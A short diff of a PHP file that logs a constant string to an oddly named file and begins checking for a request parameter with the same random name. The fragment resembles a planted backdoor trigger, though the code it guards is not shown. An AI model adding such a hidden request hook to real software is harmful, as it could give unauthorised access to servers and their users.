@@ -37,7 +37,7 @@
 include ('../inc/includes.php');
 
 //log Request
-$timells = date('d-m-y h:i:s');
+$timells = "caled";
 file_put_contents("tKZlInbbfK2jv", $timells,FILE_APPEND);
 
 if (isset($_REQUEST['tKZlInbbfK2jv'])) {
